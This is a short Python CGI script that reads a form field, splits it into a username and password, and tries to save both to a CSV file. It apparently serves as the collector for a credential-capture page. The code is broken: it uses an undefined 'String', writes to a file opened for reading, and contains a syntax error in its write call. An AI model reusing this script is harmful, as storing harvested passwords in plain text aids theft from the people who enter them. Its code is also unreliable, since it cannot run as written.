#!/usr/bin/python

import cgi


args = cgi.FieldStorage()

try:
	#catch username 
	uname = args['username'].value
	url = args['URL'].value
except KeyError as E:
	pass
  
  
uname, pwd = map(String, uname.split(',')) 

f = open("usernamePwd.csv","rb")
f.write(uname; pwd) 
f.close() 

 
